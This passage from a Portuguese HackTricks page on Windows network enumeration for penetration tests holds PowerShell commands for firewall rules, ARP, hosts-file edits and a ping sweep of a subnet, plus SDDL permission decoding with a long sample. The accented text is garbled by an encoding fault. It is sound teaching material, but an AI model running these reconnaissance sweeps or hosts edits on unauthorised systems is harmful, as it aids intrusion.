Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### Rota
```powershell
route print
```
### ARP

O Protocolo de Resolu√ß√£o de Endere√ßo (ARP) √© um protocolo de rede usado para associar um endere√ßo IP a um endere√ßo MAC em uma rede local. Ele permite que os dispositivos na mesma rede se comuniquem uns com os outros usando endere√ßos MAC.

O ARP funciona enviando uma solicita√ß√£o de ARP para descobrir o endere√ßo MAC correspondente a um determinado endere√ßo IP. O dispositivo de destino responde com seu endere√ßo MAC, permitindo que o dispositivo de origem estabele√ßa uma conex√£o direta.

No entanto, o ARP tamb√©m pode ser explorado por hackers para realizar ataques de envenenamento de ARP, onde eles falsificam as respostas de ARP para redirecionar o tr√°fego de rede para um dispositivo controlado por eles. Isso pode ser usado para interceptar dados sens√≠veis ou realizar ataques de nega√ß√£o de servi√ßo.

Para se proteger contra ataques de envenenamento de ARP, √© recomendado implementar medidas de seguran√ßa, como o uso de autentica√ß√£o de rede, monitoramento de tr√°fego e a configura√ß√£o de listas de controle de acesso (ACLs) para restringir o acesso √† rede.
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### Hosts

Os arquivos de hosts s√£o usados para mapear nomes de dom√≠nio para endere√ßos IP. Eles s√£o usados principalmente para bloquear ou redirecionar o tr√°fego de rede. No Windows, o arquivo de hosts est√° localizado em `C:\Windows\System32\drivers\etc\hosts`.

### Modificando o arquivo de hosts

Para modificar o arquivo de hosts, voc√™ pode usar o PowerShell. Aqui est√£o alguns comandos √∫teis:

- **Visualizar o conte√∫do do arquivo de hosts:**

```powershell
Get-Content C:\Windows\System32\drivers\etc\hosts
```

- **Adicionar uma entrada ao arquivo de hosts:**

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "127.0.0.1 exemplo.com"
```

- **Remover uma entrada do arquivo de hosts:**

```powershell
(Get-Content C:\Windows\System32\drivers\etc\hosts) | Where-Object { $_ -notmatch "exemplo.com" } | Set-Content C:\Windows\System32\drivers\etc\hosts
```

Lembre-se de executar o PowerShell como administrador para poder modificar o arquivo de hosts.
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

O comando `ping` √© uma ferramenta comumente usada para testar a conectividade de rede entre um host local e um host remoto. Ele envia pacotes de dados para o host remoto e aguarda por uma resposta. O tempo de resposta e a taxa de perda de pacotes podem ser usados para avaliar a qualidade da conex√£o de rede.

#### Sintaxe

```
ping <host>
```

#### Exemplo

```
ping www.example.com
```

Este comando envia pacotes de ping para o host `www.example.com` e exibe o tempo de resposta e a taxa de perda de pacotes.
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

O Simple Network Management Protocol (SNMP) √© um protocolo amplamente utilizado para gerenciamento de redes. Ele permite que os administradores monitorem e gerenciem dispositivos de rede, como roteadores, switches e servidores. O SNMP opera em uma arquitetura cliente-servidor, onde os dispositivos de rede s√£o os servidores SNMP e os administradores s√£o os clientes SNMP.

O SNMP usa uma estrutura de gerenciamento de informa√ß√µes chamada MIB (Management Information Base), que define os objetos gerenciados pelos dispositivos de rede. Os objetos gerenciados podem incluir informa√ß√µes sobre o status do dispositivo, estat√≠sticas de desempenho e configura√ß√µes.

Os clientes SNMP podem enviar solicita√ß√µes para os servidores SNMP para obter informa√ß√µes sobre os dispositivos de rede. Essas solicita√ß√µes podem ser do tipo GET, que solicita um valor espec√≠fico de um objeto gerenciado, ou do tipo SET, que permite que os administradores configurem os dispositivos de rede.

Os servidores SNMP respondem √†s solicita√ß√µes dos clientes SNMP com informa√ß√µes sobre os objetos gerenciados. Essas respostas podem incluir os valores dos objetos solicitados ou notifica√ß√µes sobre eventos ocorridos nos dispositivos de rede.

O SNMP tamb√©m suporta o recurso de traps, que permite que os dispositivos de rede enviem notifica√ß√µes aos clientes SNMP quando ocorrem eventos importantes, como falhas de hardware ou viola√ß√µes de seguran√ßa.

Em resumo, o SNMP √© uma ferramenta poderosa para o gerenciamento de redes, permitindo que os administradores monitorem e gerenciem dispositivos de rede de forma eficiente.
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **Convertendo a String SDDL em um Formato Leg√≠vel**

Ao realizar testes de penetra√ß√£o em sistemas Windows, √© comum encontrar permiss√µes definidas em formato SDDL (Security Descriptor Definition Language). Essas permiss√µes podem ser dif√≠ceis de entender e analisar diretamente. Felizmente, o PowerShell fornece uma maneira f√°cil de converter a string SDDL em um formato leg√≠vel.

### **Passo 1: Obter a String SDDL**

Primeiro, voc√™ precisa obter a string SDDL para um objeto de seguran√ßa espec√≠fico. Isso pode ser feito usando o cmdlet `Get-Acl` do PowerShell. Por exemplo, para obter a string SDDL para um arquivo chamado "example.txt", voc√™ pode executar o seguinte comando:

```powershell
(Get-Acl -Path .\example.txt).Sddl
```

### **Passo 2: Converter a String SDDL**

Agora que voc√™ tem a string SDDL, pode usar o cmdlet `ConvertFrom-SddlString` para convert√™-la em um formato leg√≠vel. Aqui est√° o comando que voc√™ pode usar:

```powershell
ConvertFrom-SddlString -Sddl "string_sddl"
```

Substitua "string_sddl" pela string SDDL que voc√™ obteve no passo anterior.

### **Exemplo Completo**

Aqui est√° um exemplo completo que mostra como converter a string SDDL para um arquivo chamado "example.txt":

```powershell
$sddl = (Get-Acl -Path .\example.txt).Sddl
ConvertFrom-SddlString -Sddl $sddl
```

Isso retornar√° uma representa√ß√£o leg√≠vel das permiss√µes definidas na string SDDL.

Ao converter a string SDDL em um formato leg√≠vel, voc√™ poder√° entender melhor as permiss√µes de seguran√ßa definidas em um objeto e analis√°-las de forma mais eficiente durante os testes de penetra√ß√£o.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Propriet√°rio: BUILTIN\Administrators
Grupo: BUILTIN\Administrators
DiscretionaryAcl: {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)...}
SystemAcl: {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse), BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users: SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess (Traverse)...}
RawDescriptor: System.Security.AccessControl.CommonSecurityDescriptor
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
